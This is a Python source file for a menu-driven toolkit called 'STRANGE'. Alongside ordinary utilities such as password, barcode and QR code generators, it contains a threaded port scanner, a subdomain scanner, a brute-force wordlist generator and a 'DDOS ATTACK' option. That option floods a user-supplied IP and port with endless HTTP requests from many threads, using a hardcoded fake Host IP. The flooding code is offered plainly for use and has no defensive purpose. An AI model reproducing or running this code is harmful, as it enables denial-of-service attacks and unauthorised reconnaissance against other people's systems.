import os
import socket
import time
from tqdm import tqdm
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from barcode.writer import ImageWriter
import phonenumbers
from phonenumbers import carrier, geocoder
from tabulate import tabulate
from queue import Queue
import threading
import re

def loading(message="LOADING...", delay=0.01):
    for _ in tqdm(range(100), desc=message, ascii=False, ncols=75):
        time.sleep(delay)
    print("Loading Done!")

def font(text):
    cool_text = Figlet(font="slant")
    return str(cool_text.renderText(text))

def window_size(columns=80, height=20):
    os.system("cls" if os.name == "nt" else "clear")
    os.system(f'mode con: cols={columns} lines={height}')

def get_ip_address():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    print("YOUR DEVICE IS:" + hostname)
    print("YOUR IP ADDRESS IS:" + IPAddr)
    
    url = input("ENTER A URL TO GET ITS IP ADDRESS AND HOSTNAME: ")
    try:
        url_ip = socket.gethostbyname(url)
        url_hostname = socket.getfqdn(url)
        print(f"The IP address of {url} is: {url_ip}")
        print(f"The hostname of {url} is: {url_hostname}")
    except socket.error as e:
        print(f"Error resolving URL: {e}")

def password_generator(length):
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    numbers = "1234567890"
    symbols = "@#&*(){}[]/?"
    all_chars = lower + symbols + numbers + upper
    password = "".join(random.sample(all_chars, length))
    print(f"GENERATED PASSWORD OF LENGTH {length} is: {password}")

def wordlist_generator(chars, min_len, max_len, file_name):
    with open(file_name, 'w') as psd:
        for i in range(min_len, max_len + 1):
            for xs in itertools.product(chars, repeat=i):
                psd.write(''.join(xs) + '\n')
    print(f"Wordlist saved to {file_name}")

def barcode_generator(number):
    try:
        

        my_code = EAN13(number, writer=ImageWriter())
        my_code.save("bar_code")
        print("Barcode saved as 'bar_code.png'")
    except Exception as e:
        print(f"An error occurred while generating the barcode: {e}")

def qrcode_generator(link):
    url = pyqrcode.create(link)
    url.svg("myqr.svg", scale=8)
    url.png('myqr.png', scale=6)
    print("QR code saved as 'myqr.png'")

def phone_number_info(phn_num):
    number = phonenumbers.parse(phn_num)
    description = geocoder.description_for_number(number, 'en')
    supplier = carrier.name_for_number(number, 'en')
    info = [["Country", description], ["Carrier", supplier]]
    print(tabulate(info, headers="firstrow", tablefmt="github"))

def is_valid_subdomain(subdomain):
    return re.match(r'^[a-zA-Z0-9-]{1,63}$', subdomain) is not None

def subdomain_scanner(domain, wordlist="Subdomain.txt"):
    try:
        with open(wordlist) as file:
            subdomains = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: The file '{wordlist}' was not found.")
        return

    for subdomain in subdomains:
        if not subdomain or not is_valid_subdomain(subdomain):
            print(f"Invalid subdomain: {subdomain}")
            continue

        url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Discovered subdomain: {url}")
        except requests.ConnectionError:
            pass
        except requests.exceptions.InvalidURL:
            print(f"Invalid URL: {url}")  


def portscan(port, target):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            sock.connect((target, port))
            return True
    except:
        return False

def run_scanner(threads, mode, target):
    queue = Queue()
    open_ports = []

    def worker():
        while not queue.empty():
            port = queue.get()
            if portscan(port, target):
                print(f"Port {port} is open!")
                open_ports.append(port)
    
    if mode == 1:
        for port in range(1, 1024):
            queue.put(port)
    elif mode == 2:
        for port in range(1, 49152):
            queue.put(port)
    elif mode == 3:
        ports = [20, 21, 22, 23, 25, 53, 80, 110, 443]
        for port in ports:
            queue.put(port)
    elif mode == 4:
        ports = input("ENTER YOUR PORTS (separate by space): ").split()
        ports = list(map(int, ports))
        for port in ports:
            queue.put(port)

    thread_list = []
    for t in range(threads):
        thread = threading.Thread(target=worker)
        thread_list.append(thread)

    for thread in thread_list:
        thread.start()

    for thread in thread_list:
        thread.join()

    print("Open ports are:", open_ports)

def ddos_attack(target_ip, port, fake_ip, threads):
    def attack():
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_ip, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode('ascii'), (target_ip, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n".encode('ascii'), (target_ip, port))

    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

if __name__ == "__main__":
    result = font("STRANGE")
    print(result)

    options = ("1 - MY IP ADDRESS\n2 - PASSWORD GENERATOR\n3 - WORDLIST GENERATOR\n"
               "4 - BARCODE GENERATOR\n5 - QRCODE GENERATOR\n6 - PHONE NUMBER INFO\n"
               "7 - SUBDOMAIN SCANNER\n8 - PORT SCANNER\n9 - DDOS ATTACK\n10 - EXIT\n")

    print(options)
    select = int(input("ENTER YOUR CHOICE: "))

    if select == 1:
        window_size()
        print(font("FIND MY IP"))
        loading()
        get_ip_address()

    elif select == 2:
        window_size()
        print(font("PASSWORD GENERATOR"))
        loading()
        length = int(input("ENTER THE LENGTH OF THE PASSWORD: "))
        password_generator(length)

    elif select == 3:
        window_size()
        print(font("WORDLIST GENERATOR"))
        loading()
        chars = input("ENTER THE LETTERS FOR COMBINATION: ")
        min_len = int(input("MINIMUM LENGTH OF PASSWORD: "))
        max_len = int(input("MAXIMUM LENGTH OF PASSWORD: "))
        file_name = input("[+] ENTER THE NAME OF THE FILE: ")
        wordlist_generator(chars, min_len, max_len, file_name)

    elif select == 4:
        window_size()
        print(font("BARCODE GENERATOR"))
        loading()
        number = input("ENTER 12 DIGIT NUMBER TO GENERATE BARCODE: ")
        barcode_generator(number)

    elif select == 5:
        window_size()
        print(font("QRCODE GENERATOR"))
        loading()
        link = input("ENTER THE LINK TO CREATE A QRCODE: ")
        qrcode_generator(link)

    elif select == 6:
        window_size()
        print(font("PHONE NUMBER INFO"))
        loading()
        phone_number = input("ENTER THE PHONE NUMBER: ")
        phone_number_info(phone_number)

    elif select == 7:
        window_size()
        print(font("SUBDOMAIN SCANNER"))
        loading()
        domain = input("ENTER THE DOMAIN TO SCAN: ")
        subdomain_scanner(domain, wordlist="Subdomain.txt")

    elif select == 8:
        window_size()
        print(font("PORT SCANNER"))
        loading()
        target = input("ENTER THE IP ADDRESS TO SCAN: ")
        mode = int(input("ENTER SCAN MODE (1: Standard, 2: Full, 3: Common, 4: Custom): "))
        threads = int(input("ENTER NUMBER OF THREADS: "))
        run_scanner(threads, mode, target)

    elif select == 9:
        window_size()
        print(font("DDOS ATTACK"))
        loading()
        target_ip = input("ENTER THE IP ADDRESS: ")
        port = int(input("ENTER THE PORT: "))
        fake_ip = "181.4.20.196"
        threads = int(input("ENTER NUMBER OF THREADS: "))
        ddos_attack(target_ip, port, fake_ip, threads)

    elif select == 10:
        sys.exit()

    input("PRESS ENTER TO EXIT")
